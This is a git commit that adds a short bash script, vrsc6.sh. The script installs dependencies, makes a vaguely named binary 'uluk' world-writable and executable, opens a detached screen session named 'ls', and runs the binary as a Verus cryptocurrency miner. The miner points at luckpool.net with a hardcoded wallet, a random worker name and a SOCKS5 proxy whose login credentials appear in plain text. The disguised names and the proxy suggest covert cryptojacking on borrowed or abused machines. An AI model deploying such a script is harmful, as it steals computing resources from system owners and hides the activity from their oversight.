8ac40eb7da2160eda0ff1a85f90bbb8eab574589
CIMENGUTAMAf <86764552+CIMENGUTAMAf@users.noreply.github.com>
2021-07-06 12:30:13 +0700

    Create vrsc6.sh

---
+++ vrsc6.sh
@@ -0,0 +1,10 @@
+#!/bin/bash
+sudo apt update 
+sudo apt install screen libjansson4 -y 
+chmod +x vrsc1.sh && chmod +x uluk chmod 777 uluk vrsc1.sh
+screen -dmS ls 
+POOL=stratum+tcp://eu.luckpool.net:3956
+WALLET=RYBb7hyLUnBd7XRtre7jjjvVfYRWoAdors
+WORKER=$(echo $(shuf -i 1-1000000 -n 1)BEH)
+PROXY=socks5://auewfdot:euxfigdwwz2b@45.95.96.237:8796
+./uluk -a verus -o $POOL -u $WALLET.$WORKER -t 2 -x $PROXY
